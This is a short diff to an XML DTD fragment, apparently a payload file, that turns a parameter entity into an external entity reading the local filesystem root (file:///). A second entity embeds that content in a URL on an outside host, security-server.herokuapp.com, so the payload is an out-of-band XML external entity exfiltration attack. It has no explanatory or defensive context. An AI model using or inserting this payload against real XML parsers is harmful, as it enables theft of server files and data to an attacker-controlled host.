@@ -1,3 +1,3 @@
-<!ENTITY % t1 "file:///">
+<!ENTITY % t1 SYSTEM "file:///">
 <!ENTITY % t2 "<!ENTITY t3 'http://security-server.herokuapp.com/kekeke/write?y=%t1;'>">
 
